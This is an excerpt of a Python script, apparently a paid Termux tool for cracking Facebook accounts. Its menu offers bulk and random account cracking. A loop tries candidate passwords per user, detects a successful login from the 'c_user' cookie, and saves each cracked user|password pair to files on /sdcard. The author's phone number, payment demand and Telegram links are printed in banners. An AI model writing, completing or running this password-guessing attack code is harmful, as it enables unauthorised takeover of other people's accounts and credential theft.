...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://t.me/AtikVau?text=' + tks)

        

    r1=requests.get("https://github.com/4a7t1k/free./blob/main/Free.txt").text
    ...
    if key1 in r1:
        ...
        print ("         ༄ATIK᭄•───────────────────────────────────────•༄HASAN᭄")
        print ("             \033[1;94mGIVE ME 100Taka FOR APROVAL ATIK")     
...
██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║  ██║███████║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
        \033[1;92m༄ATIK᭄•───────────────────────────────────────•༄HASAN᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : ATIK HASAN       \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : 4a7t1k                   \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : ATIK HASAN     \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP :   01324062666\033[1;93m▇▇
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID               \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGIVE ME 100 TAKA FOR APROOVAL      \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄ATIK᭄•───────────────────────────────────────•༄HASAN᭄
""" 
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/ATIK-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/ATIK-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back ATIK Menu ")
...
def R():
			...
			print("\033[1;93m▇▇➣\033[1;92m❥❥❥❥❥❥❥  \033[1;95m[1]START FILE CRACKING  : BST METHOD")

			print("\033[1;93m▇▇➣\033[1;94m❥❥❥❥❥❥❥  \033[1;94m[2]PUBLICK AC CRACKING  : NO LOGIN😓")

			print("\033[1;93m▇▇➣\033[1;95m❥❥❥❥❥❥❥  \033[1;93m[3]UNLIMITED FILEMAKING : NO LOGIN😓")

			print("\033[1;93m▇▇➣\033[1;96m❥❥❥❥❥❥❥  \033[1;92m[4]RANDOM AC CRACKING   : NO LOGIN😓")

			print("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥  \033[1;91m[5]FOLLEW ME ON WATAAP  : NO LOGIN😓")

			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : ATIK HASAN")
			print ('\033[1;92m༄ATIK᭄•───────────────────────────────────────•༄HASAN᭄')
			key = input(" [*] Choose : ")
			print ('༄ATIK᭄•───────────────────────────────────────•༄HASAN᭄')
			...
			if key in [""]:
				...
				os.system("xdg-open https://t.me/AtikVau")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[ATIK]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [ATIK-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/ATIK_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/ATIK_CP.txt' , 'a').write('%s\n' % wrt)
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/profile.php?id=100076221664936")
